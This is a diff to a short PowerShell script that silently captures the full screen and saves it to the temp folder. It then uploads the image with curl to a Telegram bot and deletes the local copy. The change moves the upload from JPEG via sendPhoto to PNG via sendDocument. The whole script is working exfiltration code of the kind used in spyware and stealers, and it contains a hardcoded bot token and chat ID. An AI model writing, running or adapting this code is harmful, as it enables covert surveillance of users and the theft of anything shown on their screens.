@@ -1,6 +1,5 @@
 $BotToken = "8160534358:AAGKwhDjIS1xGFUCSBD7zU2pBH-YnfvKV_w"
 $ChatId   = "2146236602"
-
 Add-Type -AssemblyName System.Windows.Forms
 Add-Type -AssemblyName System.Drawing
 
@@ -10,15 +9,16 @@ $g = [System.Drawing.Graphics]::FromImage($bmp)
 
 $g.CopyFromScreen($screen.X, $screen.Y, 0, 0, $bmp.Size)
 
-$path = "$env:TEMP\screen.jpg"
-$bmp.Save($path, [System.Drawing.Imaging.ImageFormat]::Jpeg)
+$path = "$env:TEMP\screen.png"
+$bmp.Save($path, [System.Drawing.Imaging.ImageFormat]::Png)
 
 $g.Dispose()
 $bmp.Dispose()
 
 & "$env:SystemRoot\System32\curl.exe" `
   -F "chat_id=$ChatId" `
-  -F "photo=@$path" `
-  "https://api.telegram.org/bot$BotToken/sendPhoto"
+  -F "document=@$path" `
+  "https://api.telegram.org/bot$BotToken/sendDocument"
 
 Remove-Item $path -Force
+
